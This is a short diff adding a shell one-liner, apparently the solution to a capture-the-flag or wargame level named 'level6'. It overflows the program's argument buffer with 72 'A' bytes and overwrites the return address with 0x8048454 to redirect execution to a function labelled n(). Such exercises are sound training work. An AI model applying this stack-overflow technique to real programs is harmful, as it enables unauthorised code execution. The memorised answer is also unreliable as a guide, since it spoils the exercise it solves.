@@ -1,0 +1,7 @@
+./level6 "$(python2 - <<'PY'
+import sys, struct
+payload = "A"*72
+payload += struct.pack("<I", 0x8048454)  # n()
+sys.stdout.write(payload + "\n")
+PY
+)"
